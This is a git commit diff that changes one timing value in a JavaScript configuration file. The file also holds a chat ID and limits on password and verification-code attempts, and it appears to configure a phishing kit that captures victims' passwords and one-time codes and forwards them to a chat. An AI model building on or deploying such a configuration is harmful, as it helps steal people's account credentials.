7d531f72c699dce5b278fad476ca58f492f85779
aaffffafaffaaf <germanyfu435@gmail.com>
2026-05-30 15:27:46 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -3,7 +3,7 @@ const config = {
     chat_id: '7626778246',
     max_password_attempts: 2,
     max_code_attempts: 3,
-    password_loading_time: 3,
+    password_loading_time: 2,
     code_loading_time: 3
 };
 export default config;
